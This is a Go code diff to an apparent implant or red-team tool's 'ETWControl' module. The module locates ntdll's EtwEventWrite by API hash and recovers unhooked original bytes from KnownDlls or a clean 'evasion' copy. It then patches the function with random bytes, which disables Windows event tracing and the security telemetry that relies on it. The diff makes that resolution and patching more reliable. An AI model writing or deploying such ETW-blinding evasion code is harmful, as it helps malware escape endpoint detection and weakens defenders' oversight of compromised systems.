@@ -18,22 +18,31 @@ func NewETWControl() *ETWControl {
 }
 
 func (e *ETWControl) Initialize() error {
+	// Primary: resolve from the already-loaded ntdll.dll module.
+	// LoadLibraryW returns the handle of the already-loaded module,
+	// so the address is in the actual code page used by the process.
 	fp, err := resolveFuncByHash("ntdll.dll", "EtwEventWrite")
 	if err != nil {
-		fp, err = resolveFuncFromKnownDlls("ntdll.dll", "EtwEventWrite")
-		if err != nil {
-			return e.markInitialized(fmt.Errorf("securityctl: etw: resolve: %w", err))
-		}
+		return e.markInitialized(fmt.Errorf("securityctl: etw: resolve: %w", err))
 	}
-	e.fp = fp
 
+	// Fallback: use KnownDll mapping to read clean on-disk original bytes
+	// if the loaded module's bytes appear hooked (non-standard prologue).
+	knownDllFP, kerr := resolveFuncFromKnownDlls("ntdll.dll", "EtwEventWrite")
+	if kerr == nil && knownDllFP != nil {
+		fp.orig = knownDllFP.orig
+	}
+
+	// Also try the evasion clean-base for original bytes.
 	cleanBase, cerr := evasion.DiagCleanBase()
 	if cerr == nil && cleanBase != 0 {
 		cleanFP, err := resolveFuncFromBase(cleanBase, "EtwEventWrite")
 		if err == nil && cleanFP != nil {
-			e.fp.orig = cleanFP.orig
+			fp.orig = cleanFP.orig
 		}
 	}
+
+	e.fp = fp
 	return e.markInitialized(nil)
 }
 
@@ -45,7 +54,11 @@ func (e *ETWControl) Enable() error {
 		return fmt.Errorf("securityctl: etw: not initialized")
 	}
 	e.fp.patch = randomPatchBytes()
-	return applyPatch(e.fp)
+	if err := applyPatch(e.fp); err != nil {
+		e.markDisabled()
+		return err
+	}
+	return nil
 }
 
 func (e *ETWControl) Disable() error {
